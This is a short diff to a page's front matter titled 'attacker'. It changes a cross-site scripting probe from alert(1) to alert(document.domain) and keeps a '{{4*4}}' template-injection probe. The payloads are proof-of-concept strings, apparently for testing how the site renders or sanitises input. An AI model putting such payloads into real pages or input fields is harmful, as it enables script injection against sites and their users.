@@ -3,4 +3,4 @@ group: Intro
 weight: 12
 title: attacker
 ---
-"><img src=/ onerror=alert(1)> {{4*4}}
+"><img src=/ onerror=alert(document.domain)> {{4*4}}
